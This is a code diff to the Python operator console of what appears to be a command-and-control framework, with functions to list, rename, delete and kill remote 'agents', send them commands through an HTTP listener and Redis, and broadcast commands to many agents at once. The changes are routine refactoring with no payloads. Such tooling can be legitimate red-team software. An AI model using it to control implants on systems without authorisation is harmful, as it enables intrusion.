@@ -17,7 +17,7 @@ server_command = {
     "uuid": f"{CYAN}List your current UUID{RESET}",
     "history": f"{CYAN}Get all commands sent to current Agent. Pulls from Redis database by UUID{RESET}",
     "clear": f"{CYAN}Clear terminal screen{RESET}",
-    "delete": f"{CYAN}Delete an agent by name or by index. Usage: {RESET}'delete <agent_name>' OR 'delete'",
+    "delete": f"{CYAN}Delete an agent by index. Usage: {RESET}'delete'",
     "rename": f"{CYAN}Rename an agent by selecting its index and pass a non empty string{RESET}",
     "uuid2name": f"{CYAN}Translate uuid to agent name. Usage: {RESET}'uuid2name <UUID>'",
     "name2uuid": f"{CYAN}Translate agent name to uuid. Usage: {RESET}'name2uuid <name>'",
@@ -26,16 +26,15 @@ server_command = {
 }
 
 null_output = [
-    "sleep",
     "exit",
 ]
 
 # Create the agents.db file and table if it's not already created in the Listeners/http/ directory.
 script_dir = os.path.dirname(os.path.abspath(__file__))
-db_path = os.path.join(script_dir, '..', 'Listeners', 'data', 'agents.db')
+db_path = os.path.join(script_dir, '..', 'Handlers', 'data', 'agents.db')
 
 # Connect to redis database. Redis stores Agent commands
-r = redis.Redis(host="127.0.0.1", port=6379, db=0, decode_responses=True)
+r = redis.Redis(host="127.0.0.1", port=6379, db=0, decode_responses=False)
 url = f"http://127.0.0.1:8000/admin" # change later to proper port/ip/domain name
 
 header = {"Content-Type": "application/json"}
@@ -44,13 +43,7 @@ header = {"Content-Type": "application/json"}
 
 
 # Sends agent commands to the Gunicorn/flask app HTTP listener at /admin
-def send_cmd(cmd):
-    if os.getenv('UUID'):
-        id = os.getenv('UUID')
-    else:
-        print(f"{RED}Agent UUID not set yet!{RESET}")
-        return
-
+def send_cmd(id, cmd):
     try:
         json_payload = {"uuid": id, "command": cmd}
         response = requests.post(url, json=json_payload, headers=header)
@@ -66,8 +59,12 @@ def send_cmd(cmd):
         key = f"{os.getenv('UUID')}-output"
         while True: # Wait for the output to appear at <uuid>-output
             if r.exists(key):
-                output = r.rpop(key) # prints last index and deletes last index
-                print(output)
+                output = r.get(key) # prints last index and deletes last index
+                r.delete(key)
+                try:
+                    print(output.decode('utf-8'))
+                except: 
+                    print(output)
                 break
             else:
                 time.sleep(1)
@@ -105,8 +102,8 @@ def history(length):
     raw = r.lrange(os.getenv('UUID'), index, -1)
     hist = []
     for i in range(len(raw)):
-        if raw[i] != "SEEN" and raw[i] != "AGENT REGISTERED": # Skip lines that have SEEN or AGENT REGISTERED
-            hist.append(raw[i])
+        if raw[i].decode('utf-8') != "SEEN" and raw[i].decode('utf-8') != "AGENT REGISTERED": # Skip lines that have SEEN or AGENT REGISTERED
+            hist.append(raw[i].decode('utf-8'))
     
     for i in range(len(hist)):
         print(f'{i}) {hist[i]}')
@@ -116,44 +113,34 @@ def clear(bruh):
     os.system("clear")
 
 
-def delete(name):
-    if name: # Delete by agent name provided
+def delete(bruh):
+    agent_list = print_table()
+    agent_index = list(map(int, input(f"{CYAN}Select Agent indexes separated by spaces: {RESET}").split()))
+    for i in range(len(agent_index)):
         conn = sqlite3.connect(db_path)
         cur = conn.cursor()
-        cur.execute("SELECT uuid FROM agents WHERE name = ?", (name,))
-        uuid = cur.fetchone()
-        if not uuid:
-            print(f"{RED}ERROR: Invalid agent name {RESET}")
-            return
-
-        cur.execute("DELETE FROM agents WHERE name = ?", (name,))
+        sql_delete = "DELETE FROM agents WHERE uuid = ? AND NOT status = ?" # Update sqlite database
+        uuid = agent_list[agent_index[i]][0]
+        name = agent_list[agent_index[i]][1]
+        cur.execute(sql_delete, (uuid, "ALIVE"))
         conn.commit()
-        conn.close()
-            
         if os.getenv('UUID') and uuid == os.environ['UUID']:
             del os.environ['UUID']
+        
+        if cur.rowcount == 0:
+            print(f'{RED}ERROR: An Agent is alive{RESET}')
+            choice = input(f'{RED}Are you sure you want to delete: {name}? THIS WILL KILL THE AGENT!{RESET} (y/n): ')
 
-    else: # Delete by index
-        agent_list = print_table()
-
-        try: 
-            agent_index = int(input(f"{CYAN}Select an Agent to Delete: {RESET}"))
-            if agent_index > len(agent_list) - 1:
-                print(f"{RED}ERROR: Invalid agent index {RESET}")
-                return
-        except ValueError:
-            print(f"{RED}ERROR: Input must be a number {RESET}")
-            return
-
-        conn = sqlite3.connect(db_path)
-        cur = conn.cursor()
-        sql_delete = "DELETE FROM agents WHERE uuid = ?" # Update sqlite database
-        uuid = agent_list[agent_index][0]
-        cur.execute(sql_delete, (uuid,))
-        conn.commit()
+            if choice == "y" or choice == "Y":
+                send_cmd(agent_list[agent_index[i]][0], "exit")
+            else:
+                print(f'{CYAN}Skipping:{RESET} {name}')
+        else:
+            r.delete(uuid)
+            r.delete(f"{uuid}-output")
         conn.close
-        if os.getenv('UUID') and uuid == os.environ['UUID']:
-            del os.environ['UUID']
+
+
 
 # Rename agents by index
 def rename(name):
@@ -261,21 +248,27 @@ def mass(bruh):
     # handles commands that don't return outputs. 
     cmd = command.split(" ", 1)
     if cmd[0] in null_output:
+        print(f"{CYAN}=============== No Output Expected. Skipping... ==============={RESET}\n")
         return
 
     while True:
         remove = []
         for name, key in output_keys.items():
             if r.exists(key):
-                output = r.rpop(key)
-                print(f"{GREEN}{name}:\n{RESET}{output}\n")
-                remove.append(name)
+                output = r.get(key)
+                r.delete(key)
+                try:
+                    print(f"{GREEN}{name}:\n{RESET}{output.decode('utf-8')}\n")
+                    remove.append(name)
+                except:
+                    print(output)
+                    remove.append(name)
 
         for name in remove:
             del output_keys[name]
 
         if not output_keys:
-            print(f"{CYAN}=============== All Output Received ==============={RESET}")
+            print(f"{CYAN}=============== All Output Received ==============={RESET}\n")
             break
 
         time.sleep(1)
